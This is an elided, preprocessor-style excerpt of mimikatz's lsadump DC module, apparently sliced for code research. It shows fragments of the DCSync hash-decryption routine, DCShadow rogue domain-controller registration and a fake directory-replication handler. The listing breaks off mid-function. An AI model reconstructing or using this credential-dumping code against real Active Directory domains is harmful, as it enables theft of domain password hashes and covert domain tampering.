# 1 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c"
# 11 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c"
...
BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory)
{
 ...
 {
  status = NT_SUCCESS(RtlDecryptNtOwfPwdWithIndex(encodedData + i, &rid, data));
  if(status)
  {
   if(isHistory)
 ...
 *dwProperties = FIELD_OFFSET(USER_PROPERTIES, UserProperties) + 1;
 ...
 dwPackageString += count - 1;
 dwPackageString *= sizeof(wchar_t);
 *dwProperties += FIELD_OFFSET(USER_PROPERTY, PropertyName) + (16 + (dwPackageString * 2));
...
ULONG kuhl_m_lsadump_dcshadow_register_NTDSA_AddEntry(PDCSHADOW_DOMAIN_INFO info, DRS_HANDLE hDrs)
{
 ...
 DCSHADOW_OBJECT_ATTRIBUTE attributes[] = {
  {NULL, szOID_objectclass, SYNTAX_OID, FALSE},
  {NULL, szOID_hasMasterNCs, SYNTAX_DN, FALSE},
  {NULL, szOID_dMDLocation, SYNTAX_DN, FALSE},
  {NULL, szOID_invocationId, SYNTAX_OCTET_STRING, FALSE},
  {NULL, szOID_options, SYNTAX_INTEGER, FALSE},
  {NULL, szOID_systemFlags, SYNTAX_INTEGER, FALSE},
  {NULL, szOID_serverReference, SYNTAX_DN, FALSE},
  {NULL, szOID_msDS_Behavior_Version, SYNTAX_INTEGER, FALSE},
  {NULL, szOID_msDS_HasDomainNCs, SYNTAX_DN, FALSE},
  {NULL, szOID_msDS_hasMasterNCs, SYNTAX_DN, FALSE},
 };
...
# 2840 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c"
...
{
 ULONG status, size;
# 3040 "/Users/tamofplease/Workspace/research/docker-exp/workspace/mimikatz/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c"
...
ULONG SRV_IDL_DRSGetNCChanges(DRS_HANDLE hDrs, DWORD dwInVersion, DRS_MSG_GETCHGREQ *pmsgIn, DWORD *pdwOutVersion, DRS_MSG_GETCHGREPLY *pmsgOut)
{
 ...
 if(dwInVersion == 8)
 {
   ...
   *pdwOutVersion = 6;
   ...
   if(pmsgOut->V6.pUpToDateVecSrc = (UPTODATE_VECTOR_V2_EXT *) MIDL_user_allocate(sizeof(UPTODATE_VECTOR_V2_EXT)))
   {
